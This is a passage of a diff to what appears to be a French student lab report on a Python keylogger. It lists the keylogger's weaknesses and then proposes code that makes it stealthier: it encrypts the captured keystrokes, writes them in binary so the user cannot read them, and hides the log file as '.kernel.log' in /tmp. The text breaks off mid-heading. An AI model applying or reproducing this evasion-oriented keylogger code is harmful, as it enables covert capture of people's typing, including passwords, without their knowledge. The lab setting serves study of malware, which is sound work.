@@ -186,3 +186,50 @@ Nous lançons notre programme, et constatons que celui-ci se lance mais n'écris
 Nous pouvons voir une ligne s'afficher dans le `tail -f log.txt` une dizaine de secondes après notre frappe.
 
 ![image-20241128091712875](./assets/image-20241128091712875.png)
+
+> Quelles sont les points failes de ce keylogger ?
+
+D'après moi, ce keylogger possède les faiblesses suivantes:
+
+- Les antivirus modernes peuvent facilement détecter un keylogger simple comme celui-ci. Nous avons l'exemple-même avec l'avertissement du terminal sur macOS qui nous indique aue ce process n'est pas trusted.
+- Le fichier `log.txt` est stocké dans un chemin évident et accessible.
+- Les données enregistrées ne sont ni chiffrées ni sécurisées.
+- Le programme pourrait ne pas fonctionner correctement sur certains systèmes ou configurations (par exemple, avec des claviers non standard).
+
+> Quelles améliorations puise-je proposer ?
+
+Nous allons essayer de résoudre les principaux soucis détaillés ci-dessus. Nous allons donc nous pencher sur une solution de chiffrement et de discretion concernant le nom du fichier, son emplacement et son exécution.
+
+Voici ce que j'aurais fait:
+
+Sur la fonction `report()`:
+
+```python
+key = Fernet.generate_key()
+cipher = Fernet(key)
+
+# [....]
+def report():
+    """
+    Report the log to the attacker's server.
+    """
+    global log, path, cipher
+    encrypted_log = cipher.encrypt(log.encode())
+    with open(path, "ab") as logfile:
+        logfile.write(encrypted_log + b"\n")
+    log = ""
+    threading.Timer(10, report).start()
+```
+
+- Chiffrement avec la ligne `encrypted_log = cipher.encrypt(log.encode()) `
+- Append dans le fichier de log en mode binaire (non lisible si l'utilisateur tombe dessus par hasard) avec la ligne `with open(path, "ab") as logfile:`
+
+Sur la localisation du fichier:
+
+```python
+path = os.path.join(os.getenv("TEMP", "/tmp"), ".kernel.log")
+```
+
+- Création du fichier de logs dans `/tmp`, masquage du nom par un autre nom moins suspect et transformation en fichier caché.
+
+Dernière mondification	
